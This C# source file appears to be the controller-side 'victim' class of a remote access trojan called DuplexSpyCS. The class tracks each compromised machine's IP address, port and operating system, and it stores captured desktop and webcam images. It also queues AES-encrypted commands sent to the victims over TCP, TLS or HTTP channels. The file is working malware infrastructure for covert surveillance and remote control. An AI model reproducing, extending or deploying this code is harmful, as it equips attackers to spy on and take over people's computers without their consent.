using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using DuplexSpyCS;
using System.Net.Security;
using static DuplexSpyCS.clsHttpListener;
using System.Xml.Linq;
using System.Collections.Concurrent;

public class clsVictim
{
    //SOCKET
    public clsListener m_listener { get; init; }
    public Socket socket { get; init; }
    public SslStream m_sslClnt { get; init; }

    public static int MAX_BUFFER_LENGTH = 65536; //Buffer size.
    public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
    public string ID; //VICTIM ONLINE ID
    public string r_addr; //REMOTE IP ADDRESS
    public int r_port; //REMOTE PORT
    public bool unix_like; //VICTIM UNIX LIKE ?

    //LATENCY
    public DateTime last_sent;
    public int latency_time = 100;

    //CRYPTOGRAPHY
    public (string public_key, string private_key) key_pairs;
    public (byte[] key, byte[] iv) _AES;
    public string challenge_text;

    //STATUS
    public int _received_bytes = 0;
    public int ReceivedBytes { get { return _received_bytes; } }
    public int _sent_bytes = 0;
    public int SentBytes { get { return _sent_bytes; } }

    //Lock
    public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
    private CancellationTokenSource _tlsCts { get; set; }

    private SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);

    //FOLDER
    public string dir_victim;

    //OS
    public string remoteOS;

    //DESKTOP
    public Image img_LastDesktop;

    //WEBCAM
    public Image img_LastWebcam;

    //HTTP
    private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();

    public Dictionary<string, List<clsPlugin.stCommandSpec>> m_dicCommandRegistry = new();

    public clsVictim(clsListener listener, Socket socket)
    {
        if (socket == null)
        {
            MessageBox.Show("Socket is null.", "class Victim", MessageBoxButtons.OK, MessageBoxIcon.Error);
            clsStore.sql_conn.WriteErrorLogs(this, "Null socket");
            return;
        }

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";
        m_listener = listener;
    }

    public clsVictim(Socket sktClnt, SslStream sslStream, clsListener listener)
    {
        socket = sktClnt;
        m_sslClnt = sslStream;
        m_listener = listener;

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";

        _tlsCts = new CancellationTokenSource();
        _ = Task.Run(() => fnTlsSendLoop(_tlsCts.Token));
    }

    ~clsVictim()
    {
        if (_tlsCts != null)
        {
            _tlsSendQueue.CompleteAdding();
            _tlsCts.Cancel();
        }
    }

    public void Send(int Command, int Param, string data)
    {
        Send(Command, Param, Encoding.UTF8.GetBytes(data));
    }
    public async void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                await _tcpSemaphore.WaitAsync();

                buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();

                socket.Send(buffer);

                clsStore.sent_bytes += buffer.Length;
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
            }
            finally
            {
                _tcpSemaphore.Release();
            }
        }
    }
    public async void Send(byte[] abBuffer)
    {
        if (abBuffer == null)
            return;

        try
        {
            await _tcpSemaphore.WaitAsync();

            socket.Send(abBuffer);

            clsStore.sent_bytes += abBuffer.Length;
        }
        catch (Exception ex)
        {
            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
        }
        finally
        {
            _tcpSemaphore.Release();
        }
    }

    public void encSend(int Command, int Param, string data)
    {
        new Thread(() =>
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(Command, Param, enc_data);

            /*
            if (Command == 2 && Param != 1)
                clsStore.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
            */
        }).Start();
    }
    public void SendCommand(string command, bool bUrge = false)
    {
        switch (m_listener.m_protocol)
        {
            case enListenerProtocol.TCP:
                encSend(2, 0, command);
                break;
            case enListenerProtocol.TLS:
                fnSslSend(command);
                break;
            case enListenerProtocol.HTTP:
                byte[] abCipher = Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv));
                if (bUrge)
                {
                    Send(new clsHttpResp(2, 0, abCipher).fnGetBytes());
                }
                else
                {
                    var listener = (clsHttpListener)m_listener;
                    var pkt = new clsHttpResp(2, 0, abCipher);
                    fnEnqueue(pkt);
                }
                break;
        }
    }

    public void fnSendCommand(string szMsg, bool bUrge = false) => fnSendCommand(szMsg.Split('|'), bUrge);
    public void fnSendCommand(string[] aMsg, bool bUrge = false) => fnSendCommand(aMsg.ToList(), bUrge);
    public void fnSendCommand(List<string> lsMsg, bool bUrge = false) => SendCommand(string.Join("|", lsMsg), bUrge);

    public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
    public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());

    public void fnSslSend(List<string> lsMsg) => fnSslSend(2, 0, string.Join("|", lsMsg));
    public void fnSslSend(int nCmd, int nParam, string szMsg) => fnSslSend(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg));
    public void fnSslSend(int nCmd, int nParam, byte[] abMsg)
    {
        clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
        byte[] abBuffer = dsp.GetBytes();

        fnSslSendRaw(abBuffer);
    }

    /// <summary>
    /// Send SSL raw data.
    /// </summary>
    /// <param name="abBuffer"></param>
    public void fnSslSendRaw(byte[] abBuffer)
    {
        _tlsSendQueue.Add(abBuffer);
    }

    /// <summary>
    /// TLS message queue.
    /// </summary>
    /// <param name="ct"></param>
    /// <returns></returns>
    public async Task fnTlsSendLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            if (_tlsSendQueue.TryTake(out var data, Timeout.Infinite, ct))
            {
                try
                {
                    await m_sslClnt.WriteAsync(data, 0, data.Length, ct);
                    await m_sslClnt.FlushAsync(ct);
                }
                catch (Exception ex)
                {
                    // log error
                    break;
                }
            }
        }
    }

    public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
    public void fnHttpSend(int nCmd, int nParam, string szMsg)
    {
        var listener = (clsHttpListener)m_listener;
        var resp = new clsHttpResp(nCmd, nParam, szMsg);
        
        fnEnqueue(resp);
    }
    public void fnHttpSend(int nCmd, int nParam, byte[] abMsg)
    {
        var listener = (clsHttpListener)m_listener;
        var resp = new clsHttpResp(nCmd, nParam, abMsg);

        fnEnqueue(resp);
    }

    public void fnEnqueue(clsHttpResp resp)
    {
        m_qResponse.Enqueue(resp);
    }

    public clsHttpResp fnGetResponse()
    {
        if (m_qResponse.Count == 0)
        {
            var config = clsStore.sql_conn.fnGetListener(m_listener.m_szName);
            return new clsHttpResp(config);
        }
        else
        {
            return m_qResponse.Dequeue();
        }
    }

    public void Reconnect()
    {

    }

    public void Disconnect()
    {
        socket.Close();
    }
}
